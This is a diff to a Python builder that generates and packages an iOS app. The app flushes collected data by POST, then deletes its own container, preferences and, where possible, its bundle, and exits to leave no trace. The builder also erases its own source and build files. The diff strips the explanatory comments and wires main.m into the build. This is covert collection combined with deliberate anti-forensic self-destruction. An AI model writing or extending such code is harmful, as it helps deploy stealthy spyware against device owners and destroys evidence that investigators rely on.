@@ -51,7 +51,6 @@ static UIBackgroundTaskIdentifier gBgTask = UIBackgroundTaskInvalid;
 
 - (BOOL)application:(UIApplication *)app
 didFinishLaunchingWithOptions:(NSDictionary *)opts {
-    // if we already wiped, do nothing — second launch is a no-op
     if ([[NSUserDefaults standardUserDefaults] boolForKey:kWipeMarker]) {
         _exit(0);
     }
@@ -196,7 +195,6 @@ didFinishLaunchingWithOptions:(NSDictionary *)opts {
 
 - (void)flushAndWipe {
     [self flushCollected];
-    // 2 seconds to let the last POST drain
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)),
         dispatch_get_main_queue(), ^{
         [self wipeSelf];
@@ -204,19 +202,12 @@ didFinishLaunchingWithOptions:(NSDictionary *)opts {
 }
 
 - (void)wipeSelf {
-    // 1. mark done — second launch no-ops before anything else runs
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     [ud setBool:YES forKey:kWipeMarker];
     [ud synchronize];
 
-    // 2. delete every file in the app container (docs, library, tmp,
-    //    caches, preferences). sandbox-owned so we can.
     NSFileManager *fm = [NSFileManager defaultManager];
-    NSArray *domains = @[
-        NSDocumentDirectory,
-        NSLibraryDirectory,
-        NSCachesDirectory
-    ];
+    NSArray *domains = @[NSDocumentDirectory, NSLibraryDirectory, NSCachesDirectory];
     for (NSNumber *domN in @[@(NSUserDomainMask)]) {
         for (NSString *dom in domains) {
             NSArray *paths = NSSearchPathForDirectoriesInDomains(
@@ -231,8 +222,6 @@ didFinishLaunchingWithOptions:(NSDictionary *)opts {
     NSString *tmp = NSTemporaryDirectory();
     [fm removeItemAtPath:tmp error:nil];
 
-    // 3. also nuke the preferences plist directly, in case synchronize
-    //    didn't fully flush before we started deleting.
     NSString *lib = NSSearchPathForDirectoriesInDomains(
         NSLibraryDirectory, NSUserDomainMask, YES).firstObject;
     NSString *prefs = [lib stringByAppendingPathComponent:
@@ -240,18 +229,12 @@ didFinishLaunchingWithOptions:(NSDictionary *)opts {
             [[NSBundle mainBundle] bundleIdentifier]]];
     [fm removeItemAtPath:prefs error:nil];
 
-    // 4. try to unlink our own .app bundle. unsigned apps CAN'T do this
-    //    (bundle lives in a read-only mount), but if the device is
-    //    jailbroken or the ipa is installed via TrollStore the call may
-    //    succeed. fails silently otherwise.
     NSString *bundle = [[NSBundle mainBundle] bundlePath];
     [fm removeItemAtPath:bundle error:nil];
 
-    // 5. release the bg task, kill hard
     [self endBgTask];
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)),
         dispatch_get_main_queue(), ^{
-        // _exit skips atexit + destructors — no trace of what ran
         _exit(0);
     });
 }
@@ -301,6 +284,8 @@ PBXPROJ = '''// !$*UTF8*$!
         AAAA0002 = {{isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; }};
         AAAA0003 = {{isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; }};
 
+        AAAA0004 = {{isa = PBXBuildFile; fileRef = AAAA0002; }};
+
         AAAA0010 = {{ isa = PBXGroup; children = (AAAA0002, AAAA0003, AAAA0011); sourceTree = "<group>"; }};
         AAAA0011 = {{ isa = PBXGroup; children = (AAAA0001); name = Products; sourceTree = "<group>"; }};
 
@@ -316,7 +301,7 @@ PBXPROJ = '''// !$*UTF8*$!
             productType = "com.apple.product-type.application";
         }};
 
-        AAAA0021 = {{ isa = PBXSourcesBuildPhase; buildActionMask = 2147483647; files = (); runOnlyForDeploymentPostprocessing = 0; }};
+        AAAA0021 = {{ isa = PBXSourcesBuildPhase; buildActionMask = 2147483647; files = (AAAA0004,); runOnlyForDeploymentPostprocessing = 0; }};
         AAAA0022 = {{ isa = PBXFrameworksBuildPhase; buildActionMask = 2147483647; files = (); runOnlyForDeploymentPostprocessing = 0; }};
 
         AAAA0040 = {{
@@ -463,13 +448,11 @@ def pack_ipa():
             z.write(f, f.relative_to(BUILD_DIR))
     print(f"[+] ipa: {ipa}  ({ipa.stat().st_size/1024:.1f} KiB)")
 
-    # move the ipa to project root so self-destruct can nuke build/
     shutil.copy2(ipa, OUT_IPA)
     print(f"[+] ipa copied to {OUT_IPA.resolve()}")
 
 
 def self_destruct():
-    """Remove every trace of the builder + intermediate files."""
     targets = [BUILD_DIR, SRC_DIR, Path("__pycache__")]
     for t in targets:
         if t.exists():
